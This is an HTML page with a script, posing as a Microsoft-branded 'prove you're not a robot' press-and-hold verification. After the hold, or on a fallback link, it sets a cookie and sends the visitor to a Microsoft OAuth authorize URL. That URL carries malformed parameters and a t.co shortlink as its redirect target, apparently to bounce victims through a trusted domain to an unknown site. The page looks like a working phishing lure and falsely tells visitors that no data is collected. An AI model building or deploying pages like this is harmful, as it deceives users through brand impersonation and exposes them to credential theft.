<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Verify — Microsoft-style Check</title>
  <meta name="description" content="Prove you're not a robot — press and hold to continue." />

  <style>
    :root{
      --bg:#f3f6f8;
      --card:#ffffff;
      --accent-start:#0078d4; /* Microsoft blue */
      --accent-end:#0063b1;
      --muted:#6b7280;
      --success:#107c10;
      --danger:#d83b01;
      --radius:12px;
      --hold-duration:2500ms; /* informational only */
      font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      color-scheme: light;
    }

    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      display:flex;
      align-items:center;
      justify-content:center;
      background:linear-gradient(180deg,#eef4fb 0%, #f3f6f8 100%);
      font-size:16px;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    .container{
      width:clamp(300px, 52vw, 920px);
      background:var(--card);
      border-radius:var(--radius);
      box-shadow: 0 8px 30px rgba(11, 20, 34, 0.08);
      padding:32px;
      display:grid;
      gap:20px;
      grid-template-columns: 1fr 360px;
      align-items:center;
    }

    /* left text column */
    .brand{
      display:flex;
      align-items:center;
      gap:12px;
      margin-bottom:6px;
    }
    .logo{
      width:48px;height:48px;border-radius:10px;
      background:linear-gradient(135deg,var(--accent-start),var(--accent-end));
      display:flex;align-items:center;justify-content:center;color:white;font-weight:700;
      box-shadow:0 6px 18px rgba(3, 37, 76, 0.12);
      font-size:18px;
    }
    h1{margin:0;font-size:20px;color:#0b233a}
    p.lead{margin:6px 0 0;color:var(--muted);line-height:1.4}

    .explain{
      margin-top:6px;color:#435361;font-size:14px;
    }

    /* right action column */
    .action{
      background:linear-gradient(180deg,rgba(3,37,76,0.02),rgba(3,37,76,0.01));
      border-radius:10px;
      padding:20px;
      display:flex;
      flex-direction:column;
      gap:14px;
      align-items:stretch;
    }

    .challenge{
      display:flex;flex-direction:column;gap:6px;
    }
    .challenge small{color:var(--muted);font-size:13px}

    .hold-wrapper{
      position:relative;
      user-select:none;
    }

    .hold-btn{
      --pad:14px 18px;
      background:linear-gradient(90deg,var(--accent-start),var(--accent-end));
      border:none;
      color:white;
      padding:var(--pad);
      font-size:15px;
      border-radius:10px;
      cursor:pointer;
      display:flex;
      gap:10px;
      align-items:center;
      justify-content:center;
      transition:transform .08s ease;
      box-shadow: 0 6px 14px rgba(3,37,76,0.18), inset 0 -2px 6px rgba(255,255,255,0.06);
      outline: none;
    }
    .hold-btn:active{transform:translateY(1px)}
    .hold-btn[aria-disabled="true"]{opacity:.7; cursor:not-allowed}

    .hold-hint{font-size:13px;color:var(--muted);text-align:center}

    /* progress ring / bar */
    .progress{
      height:10px;
      background:rgba(3,37,76,0.06);
      border-radius:999px;
      overflow:hidden;
    }
    .progress > .bar{
      height:100%;
      width:0%;
      background:linear-gradient(90deg,#c7e3ff, rgba(255,255,255,0.04));
      transition:width 0.02s linear;
    }

    .status{
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:8px;
      font-size:13px;
      color:var(--muted);
    }

    .success-msg{
      color:var(--success);
      font-weight:600;
      display:none;
      align-items:center;
      gap:8px;
    }

    .error-msg{
      color:var(--danger);
      font-weight:600;
      display:none;
      gap:8px;
    }

    /* responsive */
    @media (max-width:880px){
      .container{grid-template-columns:1fr; padding:20px}
      .action{order:3}
    }

    /* subtle focus ring for accessibility */
    .hold-btn:focus-visible{
      box-shadow: 0 0 0 4px rgba(0,120,212,0.14);
    }
  </style>
</head>
<body>
  <main class="container" role="main" aria-labelledby="title">
    <div>
      <div class="brand" aria-hidden="true">
        <!-- <div class="logo" aria-hidden="true">MS</div> -->
        <img width="80" style="margin-right: -20px; margin-left: -20px;" src="https://designwanted.com/wp-content/uploads/2023/10/Microsoft-_-Brands-_-Cover-image.png" alt="">
        <div>
          <div style="font-weight:600;color:#0b233a">Verifying Identity</div>
          <div style="font-size:13px;color:var(--muted)">Account verification</div>
        </div>
      </div>

      <h1 id="title">Prove you're not a robot</h1>
      <p class="lead">To continue to your destination, please press and hold the button on the right for a few seconds. This quick check helps protect against automated abuse.</p>

      <p class="explain">
        This verification is safe — no personal data is collected. If the check succeeds, your browser will be issued a short-lived verification cookie and you’ll be forwarded automatically.
      </p>

      <dl style="margin-top:18px;color:#394b59;font-size:14px">
        <dt style="font-weight:600">How it works</dt>
        <dd style="margin:6px 0 0; color:var(--muted)">
          • Hold the button for the required time (visible on the progress bar).<br/>
          • You can also use <strong>Space</strong> or <strong>Enter</strong> while the button is focused.<br/>
          • Release before completion to cancel.
        </dd>
      </dl>
    </div>

    <aside class="action" aria-label="Verification control">
      <div class="challenge" aria-hidden="false">
        <div style="display:flex;align-items:center;justify-content:space-between">
          <div>
            <div style="font-weight:700;color:#0b233a">Hold to Verify</div>
            <small style="color:var(--muted)">Press and hold the button below</small>
          </div>
          <div style="text-align:right;color:var(--muted);font-size:13px">Duration: <strong id="durationText">2.5s</strong></div>
        </div>

        <div class="hold-wrapper" style="margin-top:12px">
          <button id="holdBtn" class="hold-btn"
                  aria-pressed="false"
                  aria-label="Press and hold to verify"
                  role="button"
                  tabindex="0">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true" focusable="false">
              <path d="M12 2v8" stroke="rgba(255,255,255,0.9)" stroke-width="2" stroke-linecap="round"/>
              <path d="M7 12c1.5-5 8-5 9 0" stroke="rgba(255,255,255,0.9)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            <span id="btnText">Hold to confirm</span>
          </button>
        </div>

        <div class="progress" aria-hidden="false" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" style="margin-top:12px">
          <div class="bar" id="progressBar"></div>
        </div>

        <div class="status" style="margin-top:8px">
          <div id="statusText">Waiting</div>
          <div style="font-size:13px;color:var(--muted)">Browser verification</div>
        </div>

        <div class="success-msg" id="successMsg" role="status" aria-live="polite" style="margin-top:8px">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <span>Verified — redirecting...</span>
        </div>

        <div class="error-msg" id="errorMsg" role="alert" aria-live="assertive" style="margin-top:8px">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 9v4" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M12 17h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h17a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" stroke="currentColor" stroke-width="0.5" fill="none"/></svg>
          <span id="errText">Verification cancelled</span>
        </div>
      </div>

      <div style="font-size:13px;color:var(--muted);margin-top:6px">Problems? <a href="#" id="altLink" style="color:var(--accent-start);text-decoration:none">Try a different verification</a></div>
    </aside>
  </main>

  <script>
    (function(){
      // === CONFIG ===
      const HOLD_TIME_MS = 2500;      // required hold duration in ms
      const COOKIE_NAME = "human_verified";
      const COOKIE_MAX_AGE = 60*60;   // seconds (1 hour)
      const NEXT_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=683247bf-2ed1-425a-b54d-3be637be357f&response_type=code&redirect_uri=https%3A%2F%2Ft.co%2FtsUJTdwly7&response_mode=query2&scope=openid+profile+https%3A%2F%2Fgraph.microsoft.com%2FUser.Read&state=ac9d53cd105cbe7bc3d34a4615c43876&prompt=none&code_challenges=ckI3CWBwXitgVv1wYesuDIZ68IWpMtr1-dHAsceBhaw&code_challenges_method=S256"; // <-- REPLACE with your target URL
      // =================

      // DOM
      const holdBtn = document.getElementById("holdBtn");
      const progress = document.getElementById("progressBar");
      const statusText = document.getElementById("statusText");
      const successMsg = document.getElementById("successMsg");
      const errorMsg = document.getElementById("errorMsg");
      const errText = document.getElementById("errText");
      const durationText = document.getElementById("durationText");
      const btnText = document.getElementById("btnText");
      const altLink = document.getElementById("altLink");

      durationText.textContent = (HOLD_TIME_MS / 1000) + "s";

      let timer = null;
      let startTime = 0;
      let progressRAF = null;
      let isHolding = false;

      // Accessibility: allow keyboard activation
      holdBtn.addEventListener("keydown", (ev) => {
        if (ev.code === "Space" || ev.code === "Enter") {
          ev.preventDefault();
          if (!isHolding) startHold();
        }
      });
      holdBtn.addEventListener("keyup", (ev) => {
        if (ev.code === "Space" || ev.code === "Enter") {
          ev.preventDefault();
          if (isHolding) cancelHold("Cancelled");
        }
      });

      // Mouse / touch
      holdBtn.addEventListener("mousedown", (e) => {
        if (e.button !== 0) return; // only left click
        startHold();
      });
      holdBtn.addEventListener("touchstart", (e) => { e.preventDefault(); startHold(); }, {passive:false});

      // Cancel events
      document.addEventListener("mouseup", () => { if (isHolding) cancelHold("Cancelled"); });
      document.addEventListener("touchend", () => { if (isHolding) cancelHold("Cancelled"); });
      document.addEventListener("touchcancel", () => { if (isHolding) cancelHold("Cancelled"); });

      // Prevent context menu while holding (optional)
      holdBtn.addEventListener("contextmenu", (e) => e.preventDefault());

      function startHold(){
        if (isHolding) return;
        isHolding = true;
        holdBtn.setAttribute("aria-pressed","true");
        holdBtn.setAttribute("aria-disabled","true");
        btnText.textContent = "Holding...";
        statusText.textContent = "Holding — keep pressed";
        errorMsg.style.display = "none";
        successMsg.style.display = "none";

        startTime = performance.now();
        // Smooth progress via RAF
        function rafStep(ts){
          const elapsed = ts - startTime;
          const pct = Math.min(1, elapsed / HOLD_TIME_MS);
          progress.style.width = (pct * 100) + "%";
          holdBtn.style.transform = "scale(" + (1 - pct*0.005) + ")"; // subtle feedback
          holdBtn.setAttribute("data-progress", Math.round(pct*100));
          holdBtn.setAttribute("aria-valuenow", Math.round(pct*100));
          if (pct < 1) {
            progressRAF = requestAnimationFrame(rafStep);
          } else {
            completeHold();
          }
        }
        progressRAF = requestAnimationFrame(rafStep);

        // safety timer fallback
        timer = setTimeout(() => {
          // nothing here; completion handled by RAF
        }, HOLD_TIME_MS + 50);
      }

      function cancelHold(reason){
        isHolding = false;
        holdBtn.setAttribute("aria-pressed","false");
        holdBtn.setAttribute("aria-disabled","false");
        btnText.textContent = "Hold to confirm";
        statusText.textContent = "Waiting";
        if (timer) { clearTimeout(timer); timer = null; }
        if (progressRAF) { cancelAnimationFrame(progressRAF); progressRAF = null; }
        progress.style.width = "0%";
        holdBtn.style.transform = "none";
        errText.textContent = reason || "Verification cancelled";
        errorMsg.style.display = "flex";

        // hide after short time
        setTimeout(()=>{ errorMsg.style.display = "none"; }, 2000);
      }

      function completeHold(){
        // finalize
        if (timer) { clearTimeout(timer); timer = null; }
        if (progressRAF) { cancelAnimationFrame(progressRAF); progressRAF = null; }
        isHolding = false;
        holdBtn.setAttribute("aria-pressed","false");
        holdBtn.setAttribute("aria-disabled","true");
        progress.style.width = "100%";
        btnText.textContent = "Verified";
        statusText.textContent = "Verified";
        successMsg.style.display = "flex";

        // set cookie
        setCookie(COOKIE_NAME, "1", COOKIE_MAX_AGE);

        // small delay so user sees success
        setTimeout(() => {
          // redirect
          try {
            // use replace to avoid going back to verification page
            window.location.replace(NEXT_URL);
          } catch (e) {
            // fallback to assign
            window.location.href = NEXT_URL;
          }
        }, 700);
      }

      function setCookie(name, value, maxAgeSeconds){
        // set cookie with sane defaults: path=/, SameSite=Lax
        const cookie = encodeURIComponent(name) + "=" + encodeURIComponent(value)
          + ";path=/;max-age=" + Number(maxAgeSeconds)
          + ";SameSite=Lax";
        document.cookie = cookie;
      }

      // Link to alternative (simple fallback)
      altLink.addEventListener("click", (e) => {
        e.preventDefault();
        // fallback method: simple click
        if (!confirm("Use alternative verification? Click OK to proceed.")) return;
        setCookie(COOKIE_NAME, "1", COOKIE_MAX_AGE);
        window.location.replace(NEXT_URL);
      });

      // Defensive: if cookie already present, redirect immediately
      (function checkExistingCookie(){
        const cookies = document.cookie.split(";").map(s=>s.trim());
        for (const c of cookies){
          if (c.startsWith(COOKIE_NAME + "=")){
            // already verified
            statusText.textContent = "Already verified — redirecting";
            successMsg.style.display = "flex";
            setTimeout(()=>window.location.replace(NEXT_URL), 500);
            return;
          }
        }
      })();

    })();
  </script>
</body>
</html>
